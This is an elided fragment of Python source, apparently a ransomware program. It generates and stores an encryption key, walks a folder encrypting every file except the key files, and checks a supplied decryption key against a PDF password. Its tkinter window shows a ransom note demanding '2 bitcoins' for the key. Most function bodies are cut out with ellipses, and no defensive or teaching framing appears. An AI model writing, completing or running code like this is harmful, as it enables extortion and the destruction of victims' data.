...
def generate_and_save_key():
    ...
    key_path = os.path.join(folder_path, "thekey.key")
...
def encrypt_files():
    ...
    for root, _, files in os.walk(folder_path):
        for file in files:
            if file == "thekey.key" or file == "thekey.pdf":
                continue
...
def decrypt_files():
    ...
    if decryption_key is not None:  # Check if the user provided a key
        # Check if the decryption key is correct (e.g., by comparing it to the PDF password)
        if decryption_key == pdf_password:
...
# Create labels with instructions for decryption
instructions_label1 = tk.Label(app, text="How to decrypt:")
instructions_label2 = tk.Label(app, text="Step 1: Send me 2 bitcoins to get the decryption key.")
